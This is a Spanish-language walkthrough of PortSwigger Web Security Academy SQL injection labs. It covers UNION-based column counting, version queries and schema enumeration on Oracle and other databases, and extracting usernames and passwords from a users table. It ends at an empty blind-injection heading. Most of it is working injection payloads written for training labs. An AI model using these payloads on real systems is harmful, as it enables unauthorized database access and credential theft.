---
description: All labs of Portswigger https://portswigger.net/web-security/all-labs
---

# SQL Injection

## SQLI UNION attack

### Determining the number of columns returned by the query

Tenemos en primer lugar una tienda con productos y filtros:

![Tienda con filtros y productos](<../.gitbook/assets/image (22).png>)

Así que tras probar tanto pulsando en productos cómo en los filtros podemos ver las siguientes URLs.

```
filter?category=Food+%26+Drink
product?productId=1
```

Por lo que ambas pueden parecer susceptibles de ser inyectadas a través de GET, si probamos en la de filtros:

```
filter?category=Food+%26+Drink' or 1=1--
```

Vemos como se aplican todos y cada uno de los filtros, por lo que ya tenemos la URL inyectable. Ahora simplemente tenemos que elegir la opción que queramos para acabar, aunque el laboratorio sólo te da la siguiente cómo válida

```
filter?category=' union select null, null, null--
```

### Finding a column containing text

Muy sencillito tras hacer el anterior, tenemos que tener en cuenta que no todos los campos que añadimos a union select pueden soportar todos los caracteres distintos. Esto quiere decir que en ocasiones si queremos un output de una string tendremos que encontrar un campo compatible.

En este caso vemos que la vulnerabilidad la seguimos teniendo en el filtro:

```
filter?category=' union select null, null, null--
```

Por lo que tenemos que buscar en que parámetro nos permite utilizar la palabra que se ha generado, en mi caso "PscilI":

```
filter?category=' union select null, PscilI, null--
```

Es la única posición en la que se puede poner una string.

### Retrieving data from other tables

Volvemos a nuestra tienda, en esta ocasión para comenzar a sacar datos. Volvemos a tener la vulnerabilidad en los filtros, pero en esta ocasión son comentarios y únicamente son dos null, además de que ambas parece que pueden devolvernos una string.

```
filter?category='union select 'string', 'string' --
```

Cómo al principio del ejercicio nos dicen que podemos obtener un usuario y una contraseña de la tabla users podemos directamente imprimir todos aprovechándonos además de ambos campos.

```
filter?category=' union select username, password from users--

#Si solo tuviésemos un campo válido
filter?category=' union select CONCAT(username, ':', password), null from users--
```

Realizamos login con el usuario administrador y nos da por válido el laboratorio.

### Retrieving multiple values in a single column

Sin querer lo hemos medio chivado antes, en esta ocasión sólo hay un campo válido así que podemos concatenar.

```
filter?category=' union select null, CONCAT(username, ':', password) from users--

#La opción que te da PortSwigger es:
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

Logueamos como administrador y acabamos.

### Querying the database type and version on Oracle

En esta ocasión tenemos Oracle ¿Qué debemos tener en cuenta?

|        Uso       | Comando                                                                   |
| :--------------: | ------------------------------------------------------------------------- |
|    Comentario    | --comentario                                                              |
| Versión de la BD | <p>SELECT banner FROM v$version </p><p>SELECT version FROM v$instance</p> |
|    Concatenar    | 'foo'\|\|'bar'                                                            |

También existe un tema importante y es el hecho de que cuando tenemos una DB Oracle delante nuestros union select tienen que ir acompañados de un FROM. Por ejemplo se puede utilizar FROM dual ya que es una tabla por defecto de Oracle. Sin utilizar el FROM no podremos determinar el número de columnas.

```
filter?category='union select null,null from dual--
```

Ahora simplemente usando la cheatsheet de arriba sabemos cómo obtenerlo:

```
filter?category='union select banner,null from v$version--
```

### Querying the database type and version on MySQL and Microsoft

Tremendamente fácil

```
filter?category=' union select version(), null-- -
```

### Listing the database contents on non-Oracle databases

Aquí es donde podemos empezar a aprender a listar diferentes detalles de las bases de datos:

```
#Los nombres de todas las bases de datos
' union select schema_name, null from information_schema.schemata-- -

#Podemos obtener todas las tablas o aquellas de bases de datos concretas
' union select table_name, null from information_schema.tables where table_schema='public'-- -

#A continuación columnas
' union select column_name, null from information_schema.columns where table_name='users_htqqgf' and table_schema='public'-- -

#Por último los datos
' union select CONCAT(username_tgaepb,':',password_kkmkfa),null from users_htqqgf-- - 
```

### Listing the database contents on Oracle

Es similar a las bases de datos Mysql pero con pequeñas diferencias.

```
#Obtener las tablas
' union select table_name, null from all_tables--

#Obtener las columnas
' union select column_name, null from all_tab_columns where table_name='USERS_NKHBTW'--

#Obtener los datos
' union select USERNAME_TIOZOM||':'||PASSWORD_SRGLLK, null from USERS_NKHBTW--
```

## Blind SQLI attack

